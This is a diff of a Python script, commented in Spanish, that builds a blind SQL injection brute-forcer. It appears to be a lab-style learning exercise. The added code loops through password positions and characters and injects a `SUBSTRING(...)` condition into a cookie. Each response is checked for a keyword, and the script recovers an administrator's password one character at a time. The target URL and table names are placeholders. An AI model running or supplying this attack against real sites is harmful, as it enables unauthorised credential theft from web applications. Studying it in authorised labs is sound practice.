@@ -41,13 +41,27 @@ def def_handler(sig,frame):
 
 
 #Debemos saber el número límite de la contraseña paso #6.2.1.2
-numero_límite_de_la_contraseña=0
+numero_limite_de_la_contraseña=0
 
 def crear_petición():
+    contrasena=""#En esta variable vamos a guardar la contraseña
+    barra_progreso=log.progress("Fuerza bruta") #Él [log.progress] hace parte de la librería pwntools
     signal.signal(signal.SIGINT, def_handler)
     url_principal="https://pegar:el_url_principal" #Hay que agregarle [https://]
-    caracteres=string.ascii_lowercase+string.digits
-    #for posicion in range(1,numero_límite_de_la_contraseña):
+    caracteres=string.ascii_lowercase + string.digits 
+    for posicion in range(1,numero_limite_de_la_contraseña):#Este bucle nos servirá para movernos de posiciones
+        for caracter in caracteres:#Este bucle nos servirá para buscar la letra o número correcta en esa posiciíon
+        #Organizamos la cookies de burp suite de está manera
+            cookies_dicionario = {
+                'cookie_1': "valores_random_1' AND (SELECT SUBSTRING( << Password | column_1 >> ,%d,1) FROM << Usuarios | Table_name >> WHERE << Usuario | Column_2 >> = ' << Administrador | Nombre_del_usuario >> ')='%s" %(posicion,caracter),
+                'cookie_2': 'Valores random_2'
+            }
+            solicitud= requests.get(url_principal, cookies=cookies_dicionario)#Guardar las peticiones
+            if "Objeto_clave" in solicitud.text: #validamos que este el objeto clave en la respuesta.
+                contrasena+=caracter
+                break
+
+
         
     
 
